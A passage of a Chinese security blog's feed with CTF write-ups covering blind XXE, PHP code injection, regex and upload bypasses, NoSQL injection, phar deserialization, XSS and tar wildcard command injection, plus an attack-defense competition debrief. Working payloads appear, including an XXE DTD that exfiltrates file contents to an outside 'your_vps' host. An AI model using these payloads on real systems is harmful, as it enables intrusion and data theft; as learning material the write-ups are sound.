false;        ($keyword = @$_GET[&#39;keyword&#39;]) || $keyword = false;        new $_($string, $default, $keyword, @$_GET[&#39;store&#39;]);      }    }  } else if ($_=@$_COOKIE[&#39;theme&#39;]) {    $args = explode(&#39;-&#39;, $_);    if (class_exists($args[0])) {      new $args[0]($args[1], $args[2], $args[3], &#39;&#39;);    }  } else if ($_=@$_GET[&#39;info&#39;]) {    phpinfo();  }  highlight_file(__FILE__);</code></pre><p>关于代码逻辑部分简单说一下：</p><p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p><p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p><p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p><p>关于这个类的具体使用介绍：<a href="http://php.net/manual/zh/class.simplexmlelement.php" target="_blank" rel="noopener">http://php.net/manual/zh/class.simplexmlelement.php</a></p><p>这里仅仅大致用法：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-80306fef674a47a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p><img src="https://upload-images.jianshu.io/upload_images/9113969-8f4614644b563b5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p><p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p><p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file &quot;hpdoger&quot;&gt;&lt;!ENTITY % send SYSTEM &#39;http://vps/?file=%file;&#39;&gt;%send;]&gt;</code></pre><p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p><p>2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;%send;%test;%back;]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下：</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>用Curl发送请求，–cookie指定请求cookie参数</p><pre><code>curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</code></pre><p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p><p>其中：</p><ul><li>外部实体send引入外部DTD声明</li><li>参数实体test即为“中间参数实体”</li><li>&#37;为了避免编码问题</li><li>base64-encode是防止文件内容有空格导致http传输时被截断</li></ul><h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><h2 id="关于FUZZ"><a href="#关于FUZZ" class="headerlink" title="关于FUZZ"></a>关于FUZZ</h2><p>关于服务端接收请求，如果已经有lnmp的环境最好。没有的话，这里推荐两个项目：</p><ol><li><p>TheTwitchy:<a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p></li><li><p>docker快速搭建lnmp+ssh(自己的项目求start:):</p></li></ol><p><a href="https://github.com/Hpd0ger/docker-lnmp" target="_blank" rel="noopener">https://github.com/Hpd0ger/docker-lnmp</a></p><h2 id="关于XXE漏洞挖掘"><a href="#关于XXE漏洞挖掘" class="headerlink" title="关于XXE漏洞挖掘"></a>关于XXE漏洞挖掘</h2><p>XML作为介质传输流程应该是这样的：</p><p>用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断</p><p>漏洞点就在后端解析xml。</p><p>当后端使用<strong>loadXML()</strong>的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。</p><p>在挖掘漏洞的时候尤其注意两点：</p><ol><li>content-type: application/xml</li><li>xml形式的数据传输e.g:<code>&lt;user&gt;admin&lt;/user&gt;</code></li></ol><h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol><li><p>对于PHP，禁止引用外部实体</p><pre><code>libxml_disable_entity_loader(true);</code></pre></li><li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从两道CTF题目学习XXE漏洞&quot;&gt;&lt;a href=&quot;#从两道CTF题目学习XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;从两道CTF题目学习XXE漏洞&quot;&gt;&lt;/a&gt;从两道CTF题目学习XXE漏洞&lt;/h1&gt;&lt;p&gt;接触安全到现在，一直没有碰xxe相关
      
    
    </summary>
    
    
      <category term="XXE" scheme="https://hpdoger.cn/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>Code-Breaking-Puzzles WriteUp</title>
    <link href="https://hpdoger.cn/2018/12/21/Code-Breaking-Puzzles%20WriteUp/"/>
    <id>https://hpdoger.cn/2018/12/21/Code-Breaking-Puzzles WriteUp/</id>
    <published>2018-12-20T16:00:00.000Z</published>
    <updated>2019-01-08T03:12:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Code-Breaking-Puzzles-WriteUp"><a href="#Code-Breaking-Puzzles-WriteUp" class="headerlink" title="Code-Breaking-Puzzles WriteUp"></a>Code-Breaking-Puzzles WriteUp</h1><p>最近终于可以忙里偷闲来做一下P神的题目，真的能学到不少东西，对底层的一些漏洞知识学习很有帮助。感谢网上已经有好多版本的wp可以提供参考，有一些知识实在是盲区。写一些笔记，不笱求与师傅们观点相异，如果能让看文章的人更能理解这些洞点，也算是我的荣幸了。</p><h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><p>不得不说P神的代码简洁又暴力</p><pre><code>&lt;?php$action = $_GET[&#39;action&#39;] ?? &#39;&#39;;$arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;;if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {    show_source(__FILE__);} else {    $action(&#39;&#39;, $arg);}</code></pre><p>这里??是php7+的用法，<strong>$_GET[‘action’]非空则 $action = $_GET[‘action’]</strong></p><p>应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。</p><p>P神小密圈说到的方式用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”&quot;。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\think\db”。虽然很无感命名空间的说法，但是感觉和java里的package类似</p><p>接着就是调用Create_function函数来代码注入了，具体原理参考：<a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">http://blog.51cto.com/lovexm/1743442</a></p><p>直接上Poc:<br><code>action=create_function&amp;arg=;}print_r(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));//</code></p><p>别忘了注释//，否则逃脱不了函数</p><h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><pre><code>&lt;?phpfunction is_php($data){    return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);}if(empty($_FILES)) {    die(show_source(__FILE__));}$user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);$data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);if (is_php($data)) {    echo &quot;bad request&quot;;} else {    @mkdir($user_dir, 0755);    $path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;;    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path);    header(&quot;Location: $path&quot;, true, 303);} </code></pre><h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><p>又是一段粗暴的代码。逻辑很清晰：上传文件-&gt;检测是否包含php语句-&gt;否-&gt;跳转到上传的文件</p><p>很明显应该是preg_match的洞点，但是当时并不知道具体突破的思路，看了一些文章才知道，原来php用的是PCRE库的。那么什么是PCRE和NFA正则引擎？</p><h2 id="PCRE"><a href="#PCRE" class="headerlink" title="PCRE"></a>PCRE</h2><p>PCRE(Perl Compatible Regular Expressions中文含义：perl语言兼容正则表达式)是一个用C语言编写的正则表达式函数库</p><p>NFA引擎</p><pre><code>**NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态**</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。就拿这段正则语句来说</p><pre><code>preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data)</code></pre><p>如果我们输入<code>&lt;?php print;abcd</code></p><p>那么它匹配的流程应该是这样的：<br><code>&lt;?php print;abc</code><br><code>&lt;?php print;ab</code><br><code>&lt;?php print;a</code><br><code>&lt;?php print;</code><br><code>&lt;?php print;abcd</code></p><p><strong>.*</strong>会把?后的所有字符都先匹配到，发现没有[]里面的这些字符后再进行回溯。但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制</p><p>引用kk师傅的一张图：<br><img src="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/3.png" alt></p><p>5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>既然是弱类型比较，我们就用false来等价null绕过</p><pre><code>&lt;?php$f = fopen(&quot;poc.txt&quot;, &quot;w&quot;);$msg = &quot;&lt;?php print_r(scandir(&#39;../&#39;));?&gt;&quot;.str_repeat(&quot;A&quot;,1000000);fwrite($f,$msg);fclose($f);</code></pre><p>构造个上传表单完事</p><p>这也提醒我们,正确使用preg_match的重要性，用强类型等于避免很多不安全因素</p><h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>这个题真的发现很多知识碎片</p><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>首先聊聊filter的妙用。以前见到的情况和套路都是include()、file_get_contents()的参数可控，我们用php://filter/read配合base64-encode可以把文件编码成base64后输出。没想到file_put_contents文件名可控时也有magic</p><p>当我们可控的文件名$file传入参数<code>php://filter/write=convert.base64-decode/resource=shell.php</code>，$text传入<code>this is test</code>时，file_put_contents($file,$text)执行的内容如下：<br><img src="https://s1.ax1x.com/2018/12/24/F6Hv60.png" alt></p><p>可以把写入的文本进行base64编码，而且可以指定写入的文件名<code>shell.php</code>。其实这个用处还挺多的，比如将可控文本Base64编码，用伪协议写入文件的时候再decode，就能绕过<strong>后端正则对可控文本php危险语句检测</strong>的过滤</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>关键代码<br><img src="https://s1.ax1x.com/2018/12/24/F6bp0U.png" alt></p><p>$output会被转义后输入到可控文本，用上面的思路在写入文本的时候base64-decode就能绕过，注意用Host拼接$log_name。</p><p>至于绕过后缀名，这两天做工程实践的时候恰好用到了p师傅关于apache的x0a后缀解析为php的文件上传绕过，具体思路：<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a><br><img src="https://s1.ax1x.com/2018/12/24/F6bE11.png" alt></p><p>poc如下<br><img src="https://s1.ax1x.com/2018/12/24/F6b97F.png" alt></p><h1 id="php-limit"><a href="#php-limit" class="headerlink" title="php limit"></a>php limit</h1><p>这道题依然简单粗暴，代码如下</p><pre><code>&lt;?phpif(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {        eval($_GET[&#39;code&#39;]);} else {    show_source(__FILE__);}</code></pre><p>刚开始不清楚正则里(?R)的用法，看了别人的WP才知道这是PCRE的正则递归。在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，看下面这个例子<br><img src="https://i.loli.net/2019/01/08/5c3412a2631a6.jpg" alt></p><p>在匹配完b()之后，由于匹配不到[^\W]，正则就停止了。所以这里的代码执行点就是：嵌套函数且最后一个函数不能用参数值</p><p>有的师傅们用了get_defined_vars()获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用getallheaders()来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过current()、next()进而选择可控参数,poc如下</p><p><img src="https://i.loli.net/2019/01/08/5c3413c0a9be1.png" alt></p><h1 id="Nodejs魔法"><a href="#Nodejs魔法" class="headerlink" title="Nodejs魔法"></a>Nodejs魔法</h1><p>Koa框架写的登陆页面，入库的语句都写出来了<br><img src="https://i.loli.net/2018/12/02/5c033d7cc5c7a.png" alt></p><p>看到这一步很关键，因为忘了看flag在哪个表里，后面浪费了很多时间</p><p>继续看到登陆的逻辑<br><img src="https://i.loli.net/2018/12/02/5c033d7ce1b2e.png" alt><br>传入的username&amp;&amp;password非空，并且经过safe函数过滤后带入查询，如果有结果则设定session为查询结果</p><p>##分析<br>一开始绕safe就饶了好久,尝试了各种注释。最后l0cal师傅提醒，在js里toUpperCase()是可以用拉丁文的unicode绕过的，例如<code>&quot;ſ&quot;.toUpperCase()&lt;=&gt;&quot;S&quot;</code>和<code>&quot;ı&quot;.toUpperCase()&lt;=&gt;&quot;I&quot;</code></p><p>那么select 和 union 都可以绕过</p><p>一开始想多了,一直在盲注,根据时候有session判断查询的真假，结果好多东西都绕不过去，而且没看代码还在傻乎乎的测表名，十分愚蠢</p><p>有好多语句都会500，估计是云服务做了限制。。到最后发现把用户名和密码置空，后面用union查询flag，那设置的session不就是flag么。。</p><p>真的是太菜了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Code-Breaking-Puzzles-WriteUp&quot;&gt;&lt;a href=&quot;#Code-Breaking-Puzzles-WriteUp&quot; class=&quot;headerlink&quot; title=&quot;Code-Breaking-Puzzles WriteUp&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF2018 Write up</title>
    <link href="https://hpdoger.cn/2018/12/20/SWPUCTF2018%20Write%20up/"/>
    <id>https://hpdoger.cn/2018/12/20/SWPUCTF2018 Write up/</id>
    <published>2018-12-19T16:00:00.000Z</published>
    <updated>2019-01-17T06:48:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>恰逢复习期，也没什么事，打一场SWPUCTF来放松一下，感谢西油出题师傅。最后狗了个第十二名，顺便吐槽一下队友起的什么智障名字。。<br><img src="https://i.loli.net/2018/12/20/5c1b02a394512.png" alt></p><h1 id="SWPUCTF2018"><a href="#SWPUCTF2018" class="headerlink" title="SWPUCTF2018"></a>SWPUCTF2018</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PCAP"><a href="#PCAP" class="headerlink" title="PCAP"></a>PCAP</h2><p>签到题，流量包拖wireshark追TCP包</p><h2 id="床前明月光-低头…"><a href="#床前明月光-低头…" class="headerlink" title="床前明月光,低头…"></a>床前明月光,低头…</h2><p>低头看键盘</p><pre><code>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</code></pre><p>键盘密码 99就代表9那列的第二个值</p><p>look ….. 依次读就行了</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="用优惠码买个X"><a href="#用优惠码买个X" class="headerlink" title="用优惠码买个X"></a>用优惠码买个X</h2><p>拿到题目扫目录 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br>源码如下</p><pre><code>$_SESSION[&#39;seed&#39;]=rand(0,999999999);function youhuima(){    mt_srand($_SESSION[&#39;seed&#39;]);    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;    $auth=&#39;&#39;;    $len=15;    for ( $i = 0; $i &lt; $len; $i++ ){        if($i&lt;=($len/2))              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);        else              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);    }    setcookie(&#39;Auth&#39;, $auth);}//support    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){        if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){               //执行命令        }else {              //flag字段和某些字符被过滤!        }    }else{             // 你的输入不正确!    }?&gt;</code></pre><p>根据提示应该分两部分  绕过优惠码-&gt;命令执行逃过</p><p>首先说破解优惠码，登陆时session产生0-99999999随机数为种子，通过mt_srand()种下随机数种子，mt_rand()来获取这个随机数。</p><p>这里mt_srand伪随机，具体机制可以看这篇文章：<a href="http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF</a></p><p>种子不变，生成的随机数就不变</p><p>所以通过前15位随机数，破解种子，根据种子再生成24位的随机数，也就是我们的优惠码</p><p>脚本跑随机数在字符串的位置：</p><pre><code>&lt;?php$str = &quot;lP9DUJjQ&quot;;$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;for($i=0;$i&lt;strlen($str);$i++){   $pos = strpos($randStr,$str[$i]);   echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;   //整理成方便 php_mt_seed 测试的格式  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]}echo &quot;\n&quot;;?&gt;</code></pre><p>这个的坑点，必须跑前八位优惠码，因为算法里后起位和前八位生成顺序不一样</p><p>用工具php_mt_seed跑一下<br><img src="https://i.loli.net/2018/12/20/5c1af5f2cb05b.png" alt></p><p>本地php7环境跑这个种子的24位就能得到优惠码了</p><p>优惠码成功跳转到命令执行whois查询，匹配ip时用了/m  且^ $必须匹配头尾，%0a换行绕过检测，0a后面写规范ip</p><p>过滤了查询flag的语句，用”” 或者\绕过都行</p><p>完整payload:</p><pre><code>ca\t /f\lag%0a127.0.0.1</code></pre><h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><p>扫目录用个info.php</p><p>是个phpinfo然后拓展显示mongo的数据库，搭配题目叫注入，那应该是一个nosql注入了</p><p>思路很简单，用通配符猜解admin的密码</p><pre><code>username=admin&amp;password[$regex]=^**</code></pre><p>只不过要写个脚本跑验证码，这里队友写了一个提供参考</p><pre><code>import requestsimport timeimport pytesseractfrom PIL import Imageimport osfrom urllib.request import urlretrievej=0passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun{}&amp;vertify={}&quot;img_url = &#39;http://123.206.213.66:45678/vertify.php&#39;for i in range(1,20):    while j&lt;len(payload):        s = requests.session()        payloads = payload[j]        with open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;,&#39;wb&#39;) as fd:            img_1 = s.get(url=img_url)            fd.write(img_1.content)        image = Image.open(r&#39;C:\Users\asus\Desktop\image\img1.png&#39;)        vcode = pytesseract.image_to_string(image)        url_1 = url.format(str(payloads),vcode)        r = s.get(url_1,cookies=img_1.cookies)        print(r.text)        if &quot;wrong CAPTCHA!&quot; in r.text:            continue        if &quot;username or password incorrect!&quot; in r.text:            print(payloads)            j = j+1            break        if &quot;Nice!But it is not the real passwd&quot; in r.text:            passw0rd.append(payloads)            print(&quot;passw0rd is :&quot; + str(passw0rd))            j = j+1            break</code></pre><h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>题目地址：</p><p>file有个代码高亮的功能，把这些页面的额源码都Down一下</p><p>先看一下test类的__get()方法<br><img src="https://i.loli.net/2019/01/17/5c4024d7a5bbf.png" alt><br><img src="https://i.loli.net/2019/01/17/5c4024d7a663a.png" alt></p><p>__get()方法用于输出一个不可访问变量的值，<strong>不可访问不仅仅是protected和private，还有不存在的变量也属于不可访问，这点很重要</strong>。$key的值就是不可访问的参数名，这里是”source”，如果输入”xx”，echo的就是xx。</p><p>开发角度来讲，私有属性一般都会调用__get()方法用以提供外界访问。继续看下面的代码</p><pre><code>    public function get($key)    {        if(isset($this-&gt;params[$key])) {            $value = $this-&gt;params[$key];              } else {            $value = &quot;index.php&quot;;        }        return $this-&gt;file_get($value);      }    public function file_get($value)    {        $text = base64_encode(file_get_contents($value));        return $text;    }</code></pre><p>通过调用get()方法获取params数组里的值，进而获取这个值所对应的文件内容，这为获取flag文件内容做了铺垫。</p><p>所以只需要想办法使$this-&gt;params[$key] =  ‘/var/www/html/f1ag.php’</p><h3 id="瓶颈"><a href="#瓶颈" class="headerlink" title="瓶颈"></a>瓶颈</h3><p>一开始我是这样构造的攻击链：<br><img src="https://i.loli.net/2018/12/20/5c1b0f967a20a.png" alt></p><p>之前分析过phar，它在反序列化的时候不会执行构造函数即construct，所以置空参数，让test类的get方法返回文件内容，再通过c1e4r类的echo输出到页面上</p><p>但是这里有一个问题，phar序列化的时候， 不会把类的方法反序列化，所以只能控类的成员。那么就开始下面的方法：</p><h3 id="正确的思路"><a href="#正确的思路" class="headerlink" title="正确的思路"></a>正确的思路</h3><pre><code>$a = new Test();$a-&gt;params = [    &#39;source&#39; =&gt; &#39;/var/www/html/f1ag.php&#39;];$b = new Show();$b-&gt;str[&#39;str&#39;] = $a;$c = new C1e4r();$c-&gt;str = $b;</code></pre><p>思路就是：<br>我们用test类来获取f1ag.php里的内容，返回给$content(Show类)，$content的值再返回给C1e4r类的echo输出</p><p>C1e4r调用echo，而echo可以执行toString方法，所以我们让echo的值为我们要控的toString方法对应的类即show类的对象</p><h2 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h2><p>网站功能很少：提交邮箱地址-&gt;管理审核邮箱</p><p>给了hint:</p><pre><code>&lt;!--check.phpif($_POST[&#39;email&#39;]) {$email = $_POST[&#39;email&#39;];if(!filter_var($email,FILTER_VALIDATE_EMAIL)){echo &quot;error email, pleduase check your email&quot;;}else{echo &quot;等待管理员自动审核&quot;;edit/5c1a5a3a38649f668227c9fdecho $email;}}?&gt;--&gt;</code></pre><p>之前有个红日审计项目，关于filter_var()匹配email的漏洞进行了剖析:<a href="https://xz.aliyun.com/t/2501" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501</a></p><p>大致就是单引号双引号重叠，用\可以绕过空格，</p><p>然后我尝试了一下注入scirpt标签提交..尼玛直接成功了…<br><img src="https://i.loli.net/2018/12/20/5c1af8b853c84.jpg" alt></p><pre><code>email=&quot;\ &lt;sCRiPt\ sRC=https://unazizi.exeye.io/swctf&gt;&lt;/sCrIpT&gt;\ &quot;@aa.com</code></pre><p>那它的意思应该是后台管理员会随时点击这个email，就触发了xss</p><p>因为打不到管理员的cookie，就打admin.php的页面源码了<br><img src="https://i.loli.net/2018/12/20/5c1af977078cf.jpg" alt></p><p>发现后台会跳到：<code>/admin/a0a.php?cmd=whoami</code></p><p>明显RCE，直接请求到这个url，发现出题人设置了本地，且匹配IP用的是 remote_addr，也就是说无法伪装IP</p><p>后台Bot一直会请求admin.php这个页面，xss 改变它请求的参数，让本地管理员帮我们执行这个命令</p><p>用XHR发送请求或者Location重定向都可以</p><p>反弹Shell后发现还有题目，后台有个上传页面和备份页面，其中backup.php可读内容如下</p><pre><code>&lt;?phpinclude(&quot;upload.php&quot;);echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;$sys = &quot;tar -czf z.tar.gz *&quot;;chdir($upload_dir);system($sys);if(file_exists(&#39;z.tar.gz&#39;)){        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;        echo &quot;备份文件名: z.tar.gz&quot;;}else{        echo &quot;未上传文件，无法备份！&quot;;}?&gt;</code></pre><p>也就是说它会备份我们上传目录下的所有文件，即*</p><p>上传一些文件名例如<code>| echo &quot;123&quot;&gt;123.php</code></p><p>System 就会执行拼接后的$sys</p><p>当时题目坏了，出题师傅跟我说直接再弹一个shell，就可以拿到flag权限。。</p><p>然后直接给我了flag…2333…</p><h1 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h1><p>这次比赛是西南石油师傅举办的公益性比赛..觉得他们确实挺不容易的，学院不支持+自掏腰包办比赛，但是赛题质量都还不错，可见师傅们的用心，给个好评！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;恰逢复习期，也没什么事，打一场SWPUCTF来放松一下，感谢西油出题师傅。最后狗了个第十二名，顺便吐槽一下队友起的什么智障名字。。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2018/12/20/5c1b02a394512.png&quot; alt&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018线下赛感想</title>
    <link href="https://hpdoger.cn/2018/12/17/HCTF2018%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%84%9F%E6%83%B3/"/>
    <id>https://hpdoger.cn/2018/12/17/HCTF2018线下赛感想/</id>
    <published>2018-12-16T16:00:00.000Z</published>
    <updated>2018-12-17T14:00:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>跑去丢了一趟人，实在是对不起各位师傅</p><h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>比赛期恰逢考试期，几天一共就睡了几个小时，无论从体力或是经验都输的一塌糊涂。</p><p>这次比赛也算是给自己个教训，<strong>准备不充分</strong>，就把之前备好的流量成功监控了，其余的东西几乎没用</p><p>比赛开始配置网络用了挺长时间的，导致登上ssh以后就已经被别人上马了。</p><p>其实这是很吃亏的事：第一，你无法及时备份原始的目录，这就有一个很严重的后果，如果后来一不小心恢复了留有马子的备份一切功亏一篑，更严重的是，如果你的一些服务被恶意删了，那开局就直接崩盘。</p><p>第二，在你杀别人后门的时候，别人可能就已经打了你一轮，甚至可能会种新的马。而且杀后门的时间又占用了补洞的时间..新一轮的马子又会上来…</p><p>所以上线一定要快，备份打的一定要快！</p><p>教训就是，一定要在本地补好洞了，再传到机器上，宁可被打，也要修好自己的服务，被打总比down掉了好。这次吃了很大的亏，全场被check。</p><p>所以，不要随便就删漏洞点，有时候漏洞点也是功能点。补洞不代表无脑卡权限，这次include的文件包含洞就可以换成file_get_contents来补。<strong>最重要的事，不要随便就把目录555了</strong>，如果Check点是上传和下载功能就凉了</p><p>关于防御，<strong>一定要给自己留一个可用的后门</strong>,www-data权限一定得有一个，否则php进程可能都杀不掉</p><h1 id="这次比赛后要准备的东西"><a href="#这次比赛后要准备的东西" class="headerlink" title="这次比赛后要准备的东西"></a>这次比赛后要准备的东西</h1><p>吃足了教训：<strong>手动上马是非常愚蠢的行为</strong></p><h2 id="内置后门批量上马"><a href="#内置后门批量上马" class="headerlink" title="内置后门批量上马"></a>内置后门批量上马</h2><p>蓝莲花的moxiaoxi师傅的脚本思路大致是这样的：</p><p>内置后门(能执行system函数)，通过散列生成随机名字的隐藏不死马+守护进程维护不死马+软连接来隐藏真实的请求</p><p>最近要完成这个脚本</p><h2 id="心态"><a href="#心态" class="headerlink" title="心态"></a>心态</h2><p>心态真的是很重要，不要因为被打就慌张，找到洞点，补好了再上服务，切忌慌里慌张。</p><p>这次就算是交学费了，自闭</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;跑去丢了一趟人，实在是对不起各位师傅&lt;/p&gt;
&lt;h1 id=&quot;反思&quot;&gt;&lt;a href=&quot;#反思&quot; class=&quot;headerlink&quot; title=&quot;反思&quot;&gt;&lt;/a&gt;反思&lt;/h1&gt;&lt;p&gt;比赛期恰逢考试期，几天一共就睡了几个小时，无论从体力或是经验都输的一塌糊涂。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
